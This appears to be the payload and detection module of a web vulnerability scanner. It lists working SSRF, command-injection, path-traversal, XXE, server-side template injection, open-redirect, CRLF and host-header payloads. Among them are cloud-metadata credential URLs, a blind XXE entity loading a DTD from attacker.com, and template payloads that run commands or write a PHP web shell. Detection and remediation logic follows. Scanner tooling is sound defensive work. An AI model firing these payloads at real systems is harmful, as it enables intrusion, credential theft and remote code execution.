/**
 * STRIX Advanced Vulnerability Tests
 * High-priority security tests: SSRF, Command Injection, LFI, XXE, SSTI, Open Redirect, CORS
 */

import { UnifiedVulnerability } from './types';

// ============================================================================
// SSRF (Server-Side Request Forgery) Payloads
// ============================================================================

export const SSRF_PAYLOADS = [
    // Localhost variations
    { payload: 'http://127.0.0.1', name: 'Localhost IPv4' },
    { payload: 'http://localhost', name: 'Localhost hostname' },
    { payload: 'http://127.0.0.1:80', name: 'Localhost port 80' },
    { payload: 'http://127.0.0.1:443', name: 'Localhost port 443' },
    { payload: 'http://127.0.0.1:22', name: 'Localhost SSH' },
    { payload: 'http://127.0.0.1:3306', name: 'Localhost MySQL' },
    { payload: 'http://127.0.0.1:6379', name: 'Localhost Redis' },
    { payload: 'http://127.0.0.1:27017', name: 'Localhost MongoDB' },
    { payload: 'http://127.0.0.1:9200', name: 'Localhost Elasticsearch' },
    { payload: 'http://127.0.0.1:8080', name: 'Localhost 8080' },
    { payload: 'http://127.0.0.1:8443', name: 'Localhost 8443' },

    // IPv6 localhost
    { payload: 'http://[::1]', name: 'Localhost IPv6' },
    { payload: 'http://[0:0:0:0:0:0:0:1]', name: 'Localhost IPv6 full' },

    // Decimal/octal/hex encoding
    { payload: 'http://2130706433', name: 'Localhost decimal' }, // 127.0.0.1 as decimal
    { payload: 'http://0x7f000001', name: 'Localhost hex' },
    { payload: 'http://017700000001', name: 'Localhost octal' },
    { payload: 'http://127.1', name: 'Localhost short' },
    { payload: 'http://127.0.1', name: 'Localhost short 2' },

    // Cloud metadata endpoints
    { payload: 'http://169.254.169.254/latest/meta-data/', name: 'AWS metadata' },
    { payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', name: 'AWS IAM credentials' },
    { payload: 'http://169.254.169.254/latest/user-data/', name: 'AWS user-data' },
    { payload: 'http://metadata.google.internal/computeMetadata/v1/', name: 'GCP metadata' },
    { payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', name: 'Azure metadata' },
    { payload: 'http://169.254.169.254/metadata/v1/', name: 'DigitalOcean metadata' },

    // Internal network ranges
    { payload: 'http://10.0.0.1', name: 'Internal 10.x' },
    { payload: 'http://172.16.0.1', name: 'Internal 172.16.x' },
    { payload: 'http://192.168.0.1', name: 'Internal 192.168.x' },
    { payload: 'http://192.168.1.1', name: 'Internal router' },

    // URL scheme bypasses
    { payload: 'file:///etc/passwd', name: 'File scheme passwd' },
    { payload: 'file:///c:/windows/win.ini', name: 'File scheme Windows' },
    { payload: 'gopher://127.0.0.1:25/', name: 'Gopher SMTP' },
    { payload: 'dict://127.0.0.1:11211/', name: 'Dict Memcached' },

    // DNS rebinding / bypass
    { payload: 'http://localtest.me', name: 'DNS rebind localtest.me' },
    { payload: 'http://spoofed.burpcollaborator.net', name: 'OOB callback' },
    { payload: 'http://127.0.0.1.nip.io', name: 'nip.io bypass' },
    { payload: 'http://127.0.0.1.sslip.io', name: 'sslip.io bypass' },

    // Protocol smuggling
    { payload: 'http://127.0.0.1:11211/stats', name: 'Memcached stats' },
    { payload: 'http://127.0.0.1:6379/info', name: 'Redis info' },
];

// ============================================================================
// Command Injection Payloads
// ============================================================================

export const COMMAND_INJECTION_PAYLOADS = [
    // Basic injection
    { payload: '; id', name: 'Semicolon id' },
    { payload: '| id', name: 'Pipe id' },
    { payload: '|| id', name: 'Or id' },
    { payload: '&& id', name: 'And id' },
    { payload: '& id', name: 'Background id' },
    { payload: '`id`', name: 'Backtick id' },
    { payload: '$(id)', name: 'Subshell id' },

    // With newlines
    { payload: '\nid', name: 'Newline id' },
    { payload: '\r\nid', name: 'CRLF id' },
    { payload: '%0aid', name: 'URL encoded newline' },

    // Time-based detection
    { payload: '; sleep 5', name: 'Sleep 5 (Unix)' },
    { payload: '| sleep 5', name: 'Pipe sleep 5' },
    { payload: '& sleep 5', name: 'Background sleep 5' },
    { payload: '`sleep 5`', name: 'Backtick sleep 5' },
    { payload: '$(sleep 5)', name: 'Subshell sleep 5' },
    { payload: '& ping -c 5 127.0.0.1 &', name: 'Ping delay' },
    { payload: '| ping -n 5 127.0.0.1', name: 'Ping delay Windows' },
    { payload: '& timeout /t 5', name: 'Timeout Windows' },

    // Windows specific
    { payload: '& dir', name: 'Windows dir' },
    { payload: '| dir', name: 'Pipe dir Windows' },
    { payload: '& whoami', name: 'Windows whoami' },
    { payload: '| type C:\\Windows\\win.ini', name: 'Windows win.ini' },

    // Bypass attempts
    { payload: ';{id}', name: 'Brace id' },
    { payload: '${IFS}id', name: 'IFS bypass' },
    { payload: ';i]d', name: 'Bracket bypass' },
    { payload: "';id'", name: 'Quote escape' },
    { payload: '";id"', name: 'Double quote escape' },
    { payload: '\';id;\'', name: 'Quote injection' },
];

// Error patterns that indicate command injection
export const COMMAND_INJECTION_ERRORS = [
    /uid=\d+.*gid=\d+/i,                    // Unix id output
    /root:x:0:0/i,                           // /etc/passwd content
    /\[fonts\]/i,                            // Windows win.ini
    /\[extensions\]/i,                       // Windows win.ini
    /volume serial number/i,                 // Windows dir output
    /directory of/i,                         // Windows dir output
    /total \d+/i,                            // Unix ls output
    /drwx/i,                                 // Unix permissions
    /sh: \d+: /i,                            // Shell error
    /bash: /i,                               // Bash error
    /command not found/i,                    // Command error
    /syntax error/i,                         // Shell syntax error
    /bin\/sh/i,                              // Shell path in error
    /bin\/bash/i,                            // Bash path in error
    /cannot execute/i,                       // Execution error
];

// ============================================================================
// Path Traversal / LFI Payloads
// ============================================================================

export const PATH_TRAVERSAL_PAYLOADS = [
    // Basic traversal
    { payload: '../../../etc/passwd', name: 'Unix passwd 3 levels' },
    { payload: '../../../../etc/passwd', name: 'Unix passwd 4 levels' },
    { payload: '../../../../../etc/passwd', name: 'Unix passwd 5 levels' },
    { payload: '../../../../../../etc/passwd', name: 'Unix passwd 6 levels' },
    { payload: '../../../../../../../etc/passwd', name: 'Unix passwd 7 levels' },
    { payload: '....//....//....//etc/passwd', name: 'Double dot bypass' },
    { payload: '..%2f..%2f..%2fetc/passwd', name: 'URL encoded slash' },
    { payload: '%2e%2e/%2e%2e/%2e%2e/etc/passwd', name: 'URL encoded dots' },
    { payload: '..%252f..%252f..%252fetc/passwd', name: 'Double URL encode' },
    { payload: '..%c0%af..%c0%af..%c0%afetc/passwd', name: 'UTF-8 overlong' },
    { payload: '..\\..\\..\\etc\\passwd', name: 'Backslash traversal' },

    // Windows targets
    { payload: '..\\..\\..\\windows\\win.ini', name: 'Windows win.ini' },
    { payload: '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', name: 'Windows hosts' },
    { payload: '....\\\\....\\\\....\\\\windows\\\\win.ini', name: 'Double backslash' },
    { payload: 'C:\\Windows\\win.ini', name: 'Absolute Windows path' },
    { payload: 'C:/Windows/win.ini', name: 'Absolute Windows forward' },

    // Null byte injection (older systems)
    { payload: '../../../etc/passwd%00', name: 'Null byte Unix' },
    { payload: '../../../etc/passwd%00.jpg', name: 'Null byte extension' },
    { payload: '....//....//....//etc/passwd%00', name: 'Double dot null' },

    // Wrapper/filter bypass
    { payload: 'php://filter/convert.base64-encode/resource=../../../etc/passwd', name: 'PHP filter base64' },
    { payload: 'php://filter/read=string.rot13/resource=../../../etc/passwd', name: 'PHP filter rot13' },
    { payload: 'php://input', name: 'PHP input wrapper' },
    { payload: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=', name: 'Data URI RCE' },
    { payload: 'expect://id', name: 'Expect wrapper' },

    // Other sensitive files
    { payload: '../../../etc/shadow', name: 'Unix shadow' },
    { payload: '../../../etc/hosts', name: 'Unix hosts' },
    { payload: '../../../etc/hostname', name: 'Unix hostname' },
    { payload: '../../../proc/self/environ', name: 'Proc environ' },
    { payload: '../../../proc/self/cmdline', name: 'Proc cmdline' },
    { payload: '../../../var/log/apache2/access.log', name: 'Apache access log' },
    { payload: '../../../var/log/nginx/access.log', name: 'Nginx access log' },
    { payload: '....//....//....//....//....//....//etc/passwd', name: 'Deep traversal' },
];

// Patterns indicating successful LFI
export const LFI_SUCCESS_PATTERNS = [
    /root:x:0:0/i,                           // /etc/passwd
    /root:.*:0:0/i,                          // /etc/passwd variant
    /daemon:x:\d+:\d+/i,                     // /etc/passwd daemon
    /\[fonts\]/i,                            // Windows win.ini
    /\[extensions\]/i,                       // Windows win.ini
    /\[mci extensions\]/i,                   // Windows win.ini
    /localhost/i,                            // hosts file
    /127\.0\.0\.1/i,                         // hosts file
    /HTTP_USER_AGENT/i,                      // proc/environ
    /PATH=/i,                                // Environment variable
    /HOME=/i,                                // Environment variable
    /USER=/i,                                // Environment variable
    /DOCUMENT_ROOT/i,                        // Apache env
    /<?php/i,                                // PHP source leak
    /<%.*%>/i,                               // ASP/JSP source leak
];

// ============================================================================
// XXE (XML External Entity) Payloads
// ============================================================================

export const XXE_PAYLOADS = [
    // Basic XXE
    {
        payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`,
        name: 'Basic XXE passwd',
        contentType: 'application/xml'
    },
    {
        payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>`,
        name: 'Basic XXE Windows',
        contentType: 'application/xml'
    },

    // Parameter entity XXE
    {
        payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root>test</root>`,
        name: 'Parameter entity XXE',
        contentType: 'application/xml'
    },

    // SSRF via XXE
    {
        payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>`,
        name: 'XXE SSRF AWS metadata',
        contentType: 'application/xml'
    },
    {
        payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]>
<root>&xxe;</root>`,
        name: 'XXE SSRF internal port',
        contentType: 'application/xml'
    },

    // Blind XXE with external DTD
    {
        payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>
<root>test</root>`,
        name: 'Blind XXE external DTD',
        contentType: 'application/xml'
    },

    // XInclude attack
    {
        payload: `<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>`,
        name: 'XInclude attack',
        contentType: 'application/xml'
    },

    // SVG XXE
    {
        payload: `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>`,
        name: 'SVG XXE',
        contentType: 'image/svg+xml'
    },

    // SOAP XXE
    {
        payload: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><test>&xxe;</test></soap:Body>
</soap:Envelope>`,
        name: 'SOAP XXE',
        contentType: 'text/xml'
    },
];

// ============================================================================
// SSTI (Server-Side Template Injection) Payloads
// ============================================================================

export const SSTI_PAYLOADS = [
    // Detection payloads (math expressions)
    { payload: '{{7*7}}', name: 'Jinja2/Twig detection', expected: '49' },
    { payload: '${7*7}', name: 'FreeMarker/Velocity detection', expected: '49' },
    { payload: '<%= 7*7 %>', name: 'ERB detection', expected: '49' },
    { payload: '#{7*7}', name: 'Ruby/Java detection', expected: '49' },
    { payload: '*{7*7}', name: 'Thymeleaf detection', expected: '49' },
    { payload: '@(7*7)', name: 'Razor detection', expected: '49' },
    { payload: '{{= 7*7}}', name: 'Handlebars detection', expected: '49' },
    { payload: '${{7*7}}', name: 'AngularJS detection', expected: '49' },
    { payload: '{7*7}', name: 'Smarty detection', expected: '49' },
    { payload: '[[${7*7}]]', name: 'Thymeleaf inline', expected: '49' },

    // String concatenation detection
    { payload: "{{\"foo\"+\"bar\"}}", name: 'String concat Jinja2', expected: 'foobar' },
    { payload: "${'foo'+'bar'}", name: 'String concat FreeMarker', expected: 'foobar' },

    // Jinja2 (Python) RCE
    { payload: "{{config}}", name: 'Jinja2 config leak' },
    { payload: "{{self.__class__}}", name: 'Jinja2 class access' },
    { payload: "{{request.application.__globals__}}", name: 'Jinja2 globals' },
    { payload: "{{''.__class__.__mro__[2].__subclasses__()}}", name: 'Jinja2 subclasses' },

    // Twig (PHP) RCE
    { payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}", name: 'Twig RCE setup' },
    { payload: "{{['id']|filter('system')}}", name: 'Twig system call' },

    // FreeMarker (Java) RCE
    { payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', name: 'FreeMarker RCE' },
    { payload: '${object.getClass()}', name: 'FreeMarker class access' },

    // Velocity (Java)
    { payload: '#set($x=\'\')+#set($rt=$x.class.forName(\'java.lang.Runtime\'))', name: 'Velocity RCE setup' },

    // Smarty (PHP)
    { payload: '{php}echo `id`;{/php}', name: 'Smarty PHP tag' },
    { payload: '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[\'c\']); ?>",self::clearConfig())}', name: 'Smarty file write' },

    // Mako (Python)
    { payload: '${self.module.cache.util.os.popen("id").read()}', name: 'Mako RCE' },

    // Pebble (Java)
    { payload: '{% set cmd = \'id\' %}{{ [cmd]|join(\'\').getClass().forName(\'java.lang.Runtime\').getRuntime().exec(cmd) }}', name: 'Pebble RCE' },
];

// ============================================================================
// Open Redirect Payloads
// ============================================================================

export const OPEN_REDIRECT_PAYLOADS = [
    // Basic redirects
    { payload: 'https://evil.com', name: 'Basic external URL' },
    { payload: '//evil.com', name: 'Protocol-relative' },
    { payload: '/\\evil.com', name: 'Backslash bypass' },
    { payload: '\\/evil.com', name: 'Escaped backslash' },
    { payload: '////evil.com', name: 'Multiple slashes' },

    // URL encoding bypasses
    { payload: 'https:%2f%2fevil.com', name: 'URL encoded slashes' },
    { payload: 'https:%252f%252fevil.com', name: 'Double encoded' },
    { payload: '%2f%2fevil.com', name: 'Encoded protocol-relative' },

    // JavaScript URLs
    { payload: 'javascript:alert(1)', name: 'JavaScript URL' },
    { payload: 'javascript://evil.com/%0aalert(1)', name: 'JavaScript with comment' },
    { payload: 'data:text/html,<script>alert(1)</script>', name: 'Data URI' },

    // Whitespace tricks
    { payload: ' https://evil.com', name: 'Leading space' },
    { payload: '\thttps://evil.com', name: 'Leading tab' },
    { payload: 'https://evil.com ', name: 'Trailing space' },

    // Domain confusion
    { payload: 'https://evil.com?.example.com', name: 'Query string domain' },
    { payload: 'https://evil.com#.example.com', name: 'Fragment domain' },
    { payload: 'https://evil.com@example.com', name: 'At sign bypass' },
    { payload: 'https://example.com.evil.com', name: 'Subdomain of evil' },

    // Null byte / special chars
    { payload: 'https://evil.com%00.example.com', name: 'Null byte injection' },
    { payload: 'https://evil%E3%80%82com', name: 'Unicode dot' },

    // CRLF in redirect
    { payload: 'https://evil.com%0d%0aSet-Cookie:malicious=1', name: 'CRLF injection' },
];

// Common redirect parameters to test
export const REDIRECT_PARAMS = [
    'url', 'redirect', 'redirect_url', 'redirect_uri', 'redir', 'return',
    'return_url', 'returnUrl', 'returnTo', 'return_to', 'next', 'next_url',
    'target', 'destination', 'dest', 'go', 'goto', 'link', 'linkurl',
    'domain', 'callback', 'callback_url', 'continue', 'checkout_url',
    'image_url', 'forward', 'location', 'uri', 'u', 'r', 'out', 'view',
    'login_url', 'logout', 'checkout', 'data', 'reference', 'site', 'html',
    'backurl', 'returl', 'fromurl', 'file', 'page', 'feed', 'host', 'port',
    'ref', 'referrer', 'path'
];

// ============================================================================
// CORS Misconfiguration Tests
// ============================================================================

export const CORS_ORIGINS_TO_TEST = [
    // Null origin
    { origin: 'null', name: 'Null origin', severity: 'high' },

    // Wildcard in ACAO header (checked separately)

    // Reflected origin (tested with actual origin)

    // Subdomain tricks
    { origin: 'https://evil.example.com', name: 'Subdomain of target', severity: 'high' },
    { origin: 'https://example.com.evil.com', name: 'Target as subdomain of evil', severity: 'critical' },

    // Common test origins
    { origin: 'https://attacker.com', name: 'External attacker domain', severity: 'critical' },
    { origin: 'https://evil.com', name: 'Evil domain', severity: 'critical' },

    // Protocol downgrade
    { origin: 'http://example.com', name: 'HTTP downgrade', severity: 'medium' },
];

// ============================================================================
// CRLF Injection Payloads
// ============================================================================

export const CRLF_PAYLOADS = [
    { payload: '%0d%0aSet-Cookie:crlf=injection', name: 'URL encoded CRLF cookie' },
    { payload: '%0aSet-Cookie:crlf=injection', name: 'LF only cookie' },
    { payload: '%0dSet-Cookie:crlf=injection', name: 'CR only cookie' },
    { payload: '%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection', name: 'UTF-8 CRLF' },
    { payload: '%0d%0a%0d%0a<script>alert(1)</script>', name: 'CRLF to XSS' },
    { payload: '\\r\\nSet-Cookie:crlf=injection', name: 'Escaped CRLF' },
    { payload: '%u000aSet-Cookie:crlf=injection', name: 'Unicode LF' },
    { payload: '%u000dSet-Cookie:crlf=injection', name: 'Unicode CR' },
];

// ============================================================================
// Host Header Injection Payloads
// ============================================================================

export const HOST_HEADER_PAYLOADS = [
    { host: 'evil.com', name: 'Basic host injection' },
    { host: 'evil.com:80', name: 'Host with port' },
    { host: 'evil.com:443', name: 'Host with HTTPS port' },
    { xForwardedHost: 'evil.com', name: 'X-Forwarded-Host' },
    { xHost: 'evil.com', name: 'X-Host header' },
    { xForwardedServer: 'evil.com', name: 'X-Forwarded-Server' },
];

// ============================================================================
// Test Result Types
// ============================================================================

export interface AdvancedTestResult {
    vulnerable: boolean;
    payload?: string;
    evidence?: string;
    severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
    confidence: 'high' | 'medium' | 'low';
    details?: string;
}

// ============================================================================
// Test Functions
// ============================================================================

/**
 * Test for SSRF vulnerabilities
 */
export function detectSSRF(responseBody: string, payload: string): AdvancedTestResult {
    const body = responseBody.toLowerCase();

    // Check for internal network responses
    const ssrfIndicators: Array<{ pattern: RegExp; details: string }> = [
        { pattern: /ami-id/i, details: 'AWS Instance Metadata detected' },
        { pattern: /instance-id/i, details: 'AWS Instance Metadata detected' },
        { pattern: /security-credentials/i, details: 'AWS Security Credentials exposed' },
        { pattern: /iam.*role/i, details: 'AWS IAM Role info detected' },
        { pattern: /redis_version/i, details: 'Internal Redis server response detected' },
        { pattern: /mongodb/i, details: 'Internal MongoDB server response detected' },
        { pattern: /elasticsearch/i, details: 'Internal Elasticsearch server response detected' },
        { pattern: /memcached/i, details: 'Internal Memcached server response detected' },
        { pattern: /ssh-\d/i, details: 'SSH Banner from internal service detected' },
        { pattern: /openssh/i, details: 'OpenSSH header from internal service detected' },
        { pattern: /root:x:0:0/i, details: 'Local system file (/etc/passwd) retrieved via SSRF' },
        { pattern: /\[fonts\]/i, details: 'Windows system file retrieved via SSRF' },
    ];

    for (const indicator of ssrfIndicators) {
        if (indicator.pattern.test(responseBody)) {
            const match = responseBody.match(indicator.pattern);
            const context = match ? `...${responseBody.substring(Math.max(0, match.index! - 100), Math.min(responseBody.length, match.index! + 300))}...` : responseBody.slice(0, 500);

            return {
                vulnerable: true,
                payload,
                evidence: context,
                severity: payload.includes('169.254.169.254') ? 'critical' : 'high',
                confidence: 'high',
                details: indicator.details
            };
        }
    }

    return { vulnerable: false, severity: 'info', confidence: 'low' };
}

/**
 * Test for Command Injection
 */
export function detectCommandInjection(responseBody: string, baselineLength: number, responseTime: number): AdvancedTestResult {
    // Check for command output patterns
    for (const pattern of COMMAND_INJECTION_ERRORS) {
        if (pattern.test(responseBody)) {
            const match = responseBody.match(pattern);
            const context = match ? `...${responseBody.substring(Math.max(0, match.index! - 50), Math.min(responseBody.length, match.index! + 200))}...` : responseBody.slice(0, 500);

            return {
                vulnerable: true,
                evidence: context,
                severity: 'critical',
                confidence: 'high',
                details: 'Command execution output detected in response (Error-based)'
            };
        }
    }

    // Time-based detection (if response took significantly longer)
    if (responseTime > 4500) { // 4.5+ seconds suggests sleep worked
        return {
            vulnerable: true,
            evidence: `Response time: ${responseTime}ms (expected ~5000ms for sleep delay)`,
            severity: 'critical',
            confidence: 'medium',
            details: 'Time-based command injection detected (Server-side delay)'
        };
    }

    return { vulnerable: false, severity: 'info', confidence: 'low' };
}

/**
 * Test for Path Traversal / LFI
 */
export function detectPathTraversal(responseBody: string): AdvancedTestResult {
    for (const pattern of LFI_SUCCESS_PATTERNS) {
        if (pattern.test(responseBody)) {
            const match = responseBody.match(pattern);
            const context = match ? `...${responseBody.substring(Math.max(0, match.index! - 100), Math.min(responseBody.length, match.index! + 300))}...` : responseBody.slice(0, 500);

            return {
                vulnerable: true,
                evidence: context,
                severity: 'critical',
                confidence: 'high',
                details: 'Local file content detected in response'
            };
        }
    }

    return { vulnerable: false, severity: 'info', confidence: 'low' };
}

/**
 * Test for XXE
 */
export function detectXXE(responseBody: string): AdvancedTestResult {
    // Same patterns as LFI since XXE often returns file contents
    for (const pattern of LFI_SUCCESS_PATTERNS) {
        if (pattern.test(responseBody)) {
            const match = responseBody.match(pattern);
            const context = match ? `...${responseBody.substring(Math.max(0, match.index! - 100), Math.min(responseBody.length, match.index! + 300))}...` : responseBody.slice(0, 500);

            return {
                vulnerable: true,
                evidence: context,
                severity: 'critical',
                confidence: 'high',
                details: 'XXE successful - file content or internal data exposed'
            };
        }
    }

    // Check for XXE error messages that indicate parsing
    const xxeErrors = [
        /entity.*not.*defined/i,
        /external entity/i,
        /doctype.*not allowed/i,
        /dtd.*not.*allowed/i,
    ];

    for (const pattern of xxeErrors) {
        if (pattern.test(responseBody)) {
            return {
                vulnerable: false,
                evidence: responseBody.slice(0, 200),
                severity: 'info',
                confidence: 'medium',
                details: 'XXE parsing attempted but blocked'
            };
        }
    }

    return { vulnerable: false, severity: 'info', confidence: 'low' };
}

/**
 * Test for SSTI
 */
export function detectSSTI(responseBody: string, payload: { payload: string; expected?: string }): AdvancedTestResult {
    // Check for expected math result
    if (payload.expected && responseBody.includes(payload.expected)) {
        // Make sure it's not just the payload echoed back
        if (!responseBody.includes(payload.payload)) {
            return {
                vulnerable: true,
                payload: payload.payload,
                evidence: `Payload: ${payload.payload} -> Output contains: ${payload.expected}`,
                severity: 'critical',
                confidence: 'high',
                details: 'Template expression was evaluated server-side'
            };
        }
    }

    // Check for Python/Java class access indicators
    const sstiIndicators = [
        /<class '/i,
        /\[<class/i,
        /\.__class__/i,
        /\.__mro__/i,
        /flask\.config/i,
        /secret_key/i,
        /java\.lang\./i,
        /freemarker/i,
    ];

    for (const pattern of sstiIndicators) {
        if (pattern.test(responseBody)) {
            return {
                vulnerable: true,
                evidence: responseBody.slice(0, 500),
                severity: 'critical',
                confidence: 'high',
                details: 'Server-side template injection confirmed'
            };
        }
    }

    return { vulnerable: false, severity: 'info', confidence: 'low' };
}

/**
 * Test for Open Redirect
 */
export function detectOpenRedirect(
    responseStatus: number,
    responseHeaders: Record<string, string>,
    payload: string
): AdvancedTestResult {
    // Check if redirect occurred
    if (responseStatus >= 300 && responseStatus < 400) {
        const location = responseHeaders['location'] || '';

        // Check if redirecting to our payload
        if (location.includes('evil.com') ||
            location.includes('attacker.com') ||
            location.startsWith('//') ||
            location.startsWith('javascript:') ||
            location.startsWith('data:')) {
            return {
                vulnerable: true,
                payload,
                evidence: `Redirect to: ${location}`,
                severity: location.startsWith('javascript:') ? 'high' : 'medium',
                confidence: 'high',
                details: 'Application redirects to attacker-controlled URL'
            };
        }
    }

    return { vulnerable: false, severity: 'info', confidence: 'low' };
}

/**
 * Test for CORS misconfiguration
 */
export function detectCORSMisconfig(
    responseHeaders: Record<string, string>,
    testedOrigin: string
): AdvancedTestResult {
    const acao = responseHeaders['access-control-allow-origin'] || '';
    const acac = responseHeaders['access-control-allow-credentials'] || '';

    // Wildcard with credentials is most dangerous
    if (acao === '*' && acac.toLowerCase() === 'true') {
        return {
            vulnerable: true,
            evidence: `ACAO: ${acao}, ACAC: ${acac}`,
            severity: 'critical',
            confidence: 'high',
            details: 'Wildcard CORS with credentials - any site can steal data'
        };
    }

    // Reflected origin with credentials
    if (acao === testedOrigin && acac.toLowerCase() === 'true') {
        return {
            vulnerable: true,
            evidence: `Origin ${testedOrigin} reflected with credentials`,
            severity: 'critical',
            confidence: 'high',
            details: 'Origin reflection with credentials - attacker can steal authenticated data'
        };
    }

    // Null origin accepted
    if (acao === 'null') {
        return {
            vulnerable: true,
            evidence: 'Null origin accepted',
            severity: acac.toLowerCase() === 'true' ? 'high' : 'medium',
            confidence: 'high',
            details: 'Null origin allowed - sandboxed iframes can access resources'
        };
    }

    // Reflected origin without credentials (lower severity)
    if (acao === testedOrigin) {
        return {
            vulnerable: true,
            evidence: `Origin ${testedOrigin} reflected`,
            severity: 'medium',
            confidence: 'medium',
            details: 'Origin reflection without credentials - potential information disclosure'
        };
    }

    return { vulnerable: false, severity: 'info', confidence: 'low' };
}

/**
 * Generate vulnerability from test result
 */
export function createVulnerabilityFromTest(
    testType: string,
    result: AdvancedTestResult,
    url: string,
    param?: string
): UnifiedVulnerability | null {
    if (!result.vulnerable) return null;

    const vulnTemplates: Record<string, { title: string; description: string; recommendation: string; cwe: string; owasp: string }> = {
        ssrf: {
            title: 'Server-Side Request Forgery (SSRF)',
            description: 'The application makes server-side HTTP requests to attacker-controlled URLs, allowing access to internal services and cloud metadata.',
            recommendation: 'Implement URL allowlisting, disable unnecessary URL schemes, and use network segmentation to limit SSRF impact.',
            cwe: 'CWE-918',
            owasp: 'A10:2021'
        },
        command_injection: {
            title: 'OS Command Injection',
            description: 'The application passes user input to system shell commands, allowing arbitrary command execution on the server.',
            recommendation: 'Avoid calling OS commands with user input. If necessary, use strict allowlisting and parameterized commands.',
            cwe: 'CWE-78',
            owasp: 'A03:2021'
        },
        lfi: {
            title: 'Local File Inclusion (LFI) / Path Traversal',
            description: 'The application includes files from the server filesystem based on user input, exposing sensitive files.',
            recommendation: 'Use allowlisting for file paths, sanitize input to remove traversal sequences, and run with minimal filesystem permissions.',
            cwe: 'CWE-22',
            owasp: 'A01:2021'
        },
        xxe: {
            title: 'XML External Entity (XXE) Injection',
            description: 'The XML parser processes external entity references, allowing file disclosure and SSRF.',
            recommendation: 'Disable external entity processing in XML parsers. Use less complex data formats like JSON where possible.',
            cwe: 'CWE-611',
            owasp: 'A05:2021'
        },
        ssti: {
            title: 'Server-Side Template Injection (SSTI)',
            description: 'User input is embedded in server-side templates and evaluated, leading to remote code execution.',
            recommendation: 'Never embed user input directly in templates. Use sandbox mode and logic-less templates where possible.',
            cwe: 'CWE-1336',
            owasp: 'A03:2021'
        },
        open_redirect: {
            title: 'Open Redirect',
            description: 'The application redirects users to attacker-controlled URLs, enabling phishing attacks.',
            recommendation: 'Use allowlisting for redirect destinations, avoid using user input in redirect URLs.',
            cwe: 'CWE-601',
            owasp: 'A01:2021'
        },
        cors: {
            title: 'CORS Misconfiguration',
            description: 'Cross-Origin Resource Sharing policy allows malicious websites to read sensitive data.',
            recommendation: 'Configure CORS to only allow trusted origins, avoid reflecting Origin header or using wildcards with credentials.',
            cwe: 'CWE-942',
            owasp: 'A01:2021'
        }
    };

    const template = vulnTemplates[testType];
    if (!template) return null;

    const formattedEvidence = [
        `HOW: Tested parameter "${param}" with advanced payload`,
        `PAYLOAD: ${result.payload || 'Multiple payloads'}`,
        `WHY: ${result.details || 'Vulnerability indicator detected in response'}`,
        `EVIDENCE:`,
        result.evidence || 'No specific response snippet available'
    ].join('\n');

    // Generate reproduction command
    let reproCommand = '';
    const method = (result as any).method || 'GET';
    const payloadEncoded = encodeURIComponent(result.payload || '');

    if (method === 'GET') {
        const testUrl = new URL(url);
        testUrl.searchParams.set(param, result.payload || '');
        reproCommand = `curl -i "${testUrl.toString()}"`;
    } else {
        reproCommand = `curl -i -X POST -d "${param}=${result.payload || ''}" "${url}"`;
    }

    const reproSteps = [
        `Open a terminal or command prompt`,
        `Execute the following command: ${reproCommand}`,
        `Observe the response for: ${result.details || 'Vulnerability indicator'}`
    ];

    return {
        id: `${testType}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
        category: testType === 'cors' ? 'configuration' : 'injection',
        severity: result.severity,
        title: template.title,
        description: template.description + (result.details ? ` (${result.details})` : ''),
        evidence: formattedEvidence,
        location: url,
        recommendation: template.recommendation,
        url,
        parameter: param,
        cwe: template.cwe,
        owasp: template.owasp,
        payload: result.payload,
        reproCommand,
        reproSteps
    };
}

// Export all for use in scanner
export default {
    SSRF_PAYLOADS,
    COMMAND_INJECTION_PAYLOADS,
    COMMAND_INJECTION_ERRORS,
    PATH_TRAVERSAL_PAYLOADS,
    LFI_SUCCESS_PATTERNS,
    XXE_PAYLOADS,
    SSTI_PAYLOADS,
    OPEN_REDIRECT_PAYLOADS,
    REDIRECT_PARAMS,
    CORS_ORIGINS_TO_TEST,
    CRLF_PAYLOADS,
    HOST_HEADER_PAYLOADS,
    detectSSRF,
    detectCommandInjection,
    detectPathTraversal,
    detectXXE,
    detectSSTI,
    detectOpenRedirect,
    detectCORSMisconfig,
    createVulnerabilityFromTest
};
